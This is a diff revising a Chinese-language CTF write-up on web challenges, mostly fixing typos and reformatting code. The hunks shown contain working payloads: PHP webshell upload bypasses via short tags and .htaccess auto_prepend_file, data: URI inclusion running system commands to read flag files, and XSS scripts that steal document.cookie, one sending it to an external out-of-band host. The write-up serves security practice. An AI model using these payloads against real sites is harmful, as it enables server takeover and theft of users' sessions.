@@ -1,12 +1,11 @@
 ---
 title: 青岑CTF有关WEB的WP（三）
-description: 匆忙上的青岑CTF第三部分
+description: 匆忙上的青岑 CTF 第三部分
 date: 2026-04-26 19:51:01
 updated: 2026-04-26 19:51:01
 image: https://img.yanxisishi.top/images/2026/04/20260426203814880.png
 categories: [CTF]
 tags: [CTF, WP]
-
 ---
 
 ## EZREQUEST_1
@@ -183,7 +182,7 @@ phar
 
 ![image-20260423134939456](https://img.yanxisishi.top/images/2026/04/image-20260423134939456.png)
 
-也是看到演都不演了，后缀名是 html 的时候，连内容都不过滤了，直接上传成功。
+也是看到演都不演了，后缀名是 phtml 的时候，连内容都不过滤了，直接上传成功。
 
 访问 `/uploads/b87e1dbc-05e2-4e31-895d-b9405f0d8871.phtml` ，POST 传入 ：
 
@@ -224,7 +223,7 @@ GIF89a
 File content not allowed: PHP tags detected
 ```
 
-说明本题又过滤了文件内容，经测试文件内容中不能出现 `<?php` ，直接用短标签 `<?` 绕过（需目标环境开启 `short_open_tag`）：
+说明本题又过滤了文件内容，经测试文件内容中不能出现 `<?php` ，直接用短标签 `<?=` 绕过（需目标环境开启 `short_open_tag`）：
 
 ```php
 GIF89a
@@ -285,7 +284,7 @@ GIF89a
 File type not allowed
 ```
 
-看来是 html 也用不了了，看来得利用配置文件了，注意到当前服务器环境是 Apache ，尝试上传 .htaccess 文件：
+看来是 phtml 也用不了了，看来得利用配置文件了，注意到当前服务器环境是 Apache ，尝试上传 .htaccess 文件：
 
 ```htaccess
 AddType application/x-httpd-php .png
@@ -321,7 +320,7 @@ auto_prepend_file=1.png
 
 接着访问 `/uploads/index.php` ，POST 传入 `1=env` 。
 
-也可以接着通过上传 .hatccess 做这题， `AddType application/x-httpd-php .png` 失效是因为 AddType 只会改 Content-Type，不会执行 PHP ，可以上传 .htaccess ：
+也可以接着通过上传 .htaccess 做这题， `AddType application/x-httpd-php .png` 失效是因为 AddType 只会改 Content-Type，不会执行 PHP ，可以上传 .htaccess ：
 
 ```htaccess
 SetEnv PHP_VALUE "auto_prepend_file=1.png"
@@ -347,7 +346,7 @@ EOF
 bzip2 -c shell.php > shell.php.bz2
 ```
 
-得到 shell.php.bz2 ，然后上传。接着访问 `/uploads/shell.php` ，POST 传入 `1=phpionfo();` 。
+得到 shell.php.bz2 ，然后上传。接着访问 `/uploads/shell.php` ，POST 传入 `1=phpinfo();` 。
 
 ## EZFU_10
 
@@ -375,7 +374,7 @@ bzip2 -c shell.php > shell.phtml.bz2
 
 ## EZFU_11
 
-依旧先上传一句马 shell.php ，发现没有限制直接上传了，但是根据回显路径访问却是 404 。看来这题会迅速清理进程，文件会很快被删。
+依旧先上传一句马 shell.php ，发现没有限制直接上传了，但是根据回显路径访问却是 404 。看来这题会迅速清理上传文件，文件会很快被删。
 
 可以通过 bp 无限发包，让系统删不完就行了：
 
@@ -465,9 +464,6 @@ if __name__ == "__main__":
 
 ```http
 ?file=data:,<?php system('ls')?>
-```
-
-```http
 ?file=data:,<?php system('tac flag.php')?>
 ```
 
@@ -485,9 +481,6 @@ if __name__ == "__main__":
 
 ```http
 ?file=data:,<?php system('ls /')?>
-```
-
-```http
 ?file=data:,<?php system('nl /flag-r66A6J0enB7hTvWMbDHisiOZGtpmne.txt')?>
 ```
 
@@ -503,9 +496,6 @@ if __name__ == "__main__":
 
 ```http
 ?file=data:,<?pHp system('ls')?>
-```
-
-```http
 ?file=data:,<?pHp system('tac f*')?>
 ```
 
@@ -887,7 +877,7 @@ Content-Type: application/json
 
    返回：
 
-   ```ttx
+   ```txt
    [{"Id":"7b9c9a3917714842fc51928a4982e780bd7dae60b450dcf37e2bf5354b745e95","Names":["\/ctf_container"],"Image":"ubuntu:latest","ImageID":"sha256:4dd4cea3fe879b8f8c0d662114616af434fddb9691e3cd8d57e2210ef3123a4c","Command":"\/bin\/bash","Created":1777038406,"State":"running","Status":"Up 1 hour","Ports":[],"Labels":[],"SizeRw":0,"SizeRootFs":77808128,"HostConfig":{"NetworkMode":"bridge"},"NetworkSettings":{"Networks":{"bridge":{"IPAMConfig":null,"Links":null,"Aliases":null,"NetworkID":"bridge","EndpointID":"4d91f449e7eb8a8557e928c11239621b","Gateway":"172.17.0.1","IPAddress":"172.17.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"02:42:ac:11:00:02"}}},"Mounts":[]}]
    ```
 
@@ -1108,8 +1098,8 @@ Security violation: forbidden keyword detected.（安全违规：检测到禁用
 
 盲 XXE ，需要可访问的公网，这里用的是两个网站：
 
-1. **[interactsh](!https://app.interactsh.com/) ：** 一款开源带外（OOB - Out-of-Band）交互收集服务器和客户端工具。
-2. **[paste.rs](!https://paste.rs/) ：** 一个临时文本托管网站，用来把一段文本上传成公网可访问的链接。
+1. **[interactsh](https://app.interactsh.com/) ：** 一款开源带外（OOB - Out-of-Band）交互收集服务器和客户端工具。
+2. **[paste.rs](https://paste.rs/) ：** 一个临时文本托管网站，用来把一段文本上传成公网可访问的链接。
 
 这题条件好的也可以用 vps ，但是这两网站免费而且免登录，太香了。
 
@@ -1195,7 +1185,7 @@ if($a and $a==0){
 >
 > 作用：检测变量是否是数字或数字字符串。
 
-实现 `if($a and $a==0)` 为真可以利用 PHP 若比较，比如传入：
+实现 `if($a and $a==0)` 为真可以利用 PHP 弱比较，比如传入：
 
 ```http
 ?a=0abcd
@@ -1347,53 +1337,49 @@ echo $flag;
 # 下载
 go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
 # 运行
-~/go/bin/interactsh-client -v
+~/go/bin/interactsh-client -http-only -v | grep --line-buffered "^GET"
 ```
 
-得到类似 `d7md06dt5p5pl9ldceb0zy1euw6hwcmi4.oast.pro` 。
+得到类似 `d7nknptt5p5vvca0g5cgmi1fznng3kom9.oast.fun` 。
 
 在留言板输入：
 
 ```html
-<script>  
-    var img = document.createElement("img");     
-    img.src = "http://d7md06dt5p5pl9ldceb0zy1euw6hwcmi4.oast.pro/"+document.cookie
+<script>
+var img = document.createElement("img");
+img.src = "http://d7nknptt5p5vvca0g5cgmi1fznng3kom9.oast.fun/?c=" + encodeURIComponent(document.cookie);
 </script>
 ```
 
-终端确实有回显，但没有拿到 Cookie ，说明管理员 Bot 可能不能出网，放弃外带数据。
+但我失败了。
 
-不能外连，但发现站内有可写可见的地方，可以尝试写回站内。由于上传的留言是 POST 传参 `content=` ，输入：
+除此之外，发现站内有可写可见的地方，可以尝试写回站内。由于上传的留言是 POST 传参 `content=` ，输入：
 
 ```html
 <script>
-var data = "content=" + document.cookie;
-
-fetch("/guestbook", {
-    method: "POST",
-    headers: {"Content-Type": "application/x-www-form-urlencoded"},
-    body: data
-});
+fetch('/guestbook',{
+      method:'POST',
+      headers:{'Content-Type':'application/x-www-form-urlencoded'},
+      body:'content='+document.cookie
+})
 </script>
 ```
 
-没有响应，说明 `document.cookie` 里**很可能包含了会破坏表单格式的特殊字符**，不编码时后端收不到完整的 `content` ，比如 `&`、`=`、`+`、`%` 都有特殊含义。
+没拿到 flag 就多发几次。
 
-用 `encodeURIComponent` 把字符串里的特殊字符转成 `%xx` 形式，防止它们破坏 URL 或表单参数结构。重新输入：
+或者更稳点，用 `encodeURIComponent` 把字符串里的特殊字符转成 `%xx` 形式，防止它们破坏 URL 或表单参数结构。输入：
 
 ```html
 <script>
-var data = "content=" + encodeURIComponent(document.cookie);
-
-fetch("/guestbook", {
-    method: "POST",
-    headers: {"Content-Type": "application/x-www-form-urlencoded"},
-    body: data
-});
+fetch('/guestbook',{
+      method:'POST',
+      headers:{'Content-Type':'application/x-www-form-urlencoded'},
+      body:'content='+encodeURIComponent(document.cookie)
+})
 </script>
 ```
 
-得到 flag 。
+依旧没拿到 flag 就多发几次。
 
 ## EZXSS_1
 
@@ -1401,11 +1387,14 @@ fetch("/guestbook", {
 
 ```html
 <img 
-	src=x 
-    onerror="fetch('/guestbook',{
-		method:'POST',
-		headers:{'Content-Type':'application/x-www-form-urlencoded'},
-		body:'content='+encodeURIComponent(document.cookie)})"
+    src=x 
+    onerror=
+     "
+      fetch('/guestbook',{
+      method:'POST',
+      headers:{'Content-Type':'application/x-www-form-urlencoded'},
+      body:'content='+encodeURIComponent(document.cookie)})
+	"
 >
 ```
 
@@ -1437,10 +1426,10 @@ body
 
 ```html
 <svg onload="
-	fetch('/guestbook',{
-	method:'POST',
-	headers:{'Content-Type':'application/x-www-form-urlencoded'},
-	['bo' + 'dy']:'content='+encodeURIComponent(document.cookie)})
+    fetch('/guestbook',{
+    method:'POST',
+    headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    ['bo' + 'dy']:'content='+encodeURIComponent(document.cookie)})
 ">
 ```
 
@@ -1452,10 +1441,10 @@ body
 
 ```html
 <svg/onload="
-	fetch('/guestbook',{
-	method:'POST',
-	headers:{'Content-Type':'application/x-www-form-urlencoded'},
-	['bo' + 'dy']:'content='+encodeURIComponent(document.cookie)})
+    fetch('/guestbook',{
+    method:'POST',
+    headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    ['bo' + 'dy']:'content='+encodeURIComponent(document.cookie)})
 ">
 ```
 
@@ -1463,18 +1452,17 @@ body
 
 ```html
 <svg/onload="
-	fetch('/guestbook',{
-	method:'POST',
-	headers:{'Content-Type':'application/x-www-form-urlencoded'},
-	['bo'+'dy']:'content='+encodeURIComponent(document.cookie)})
+    fetch('/guestbook',{
+    method:'POST',
+    headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    ['bo'+'dy']:'content='+encodeURIComponent(document.cookie)})
 ">
 ```
 
-仍然返回 `含有非法内容` ，不知道咋过滤的，但是把 payload 换成一行就可以过了，输入：
+仍然返回 `含有非法内容` ，不知道咋过滤的，但是把 payload 换成一行就可以过了，应该可以把这题当作过滤了空格去做，输入：
 
 ```html
 <svg/onload="fetch('/guestbook',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},['bo'+'dy']:'content='+encodeURIComponent(document.cookie)})">
 ```
 
 没拿到 flag 就多发几次就行了。
-
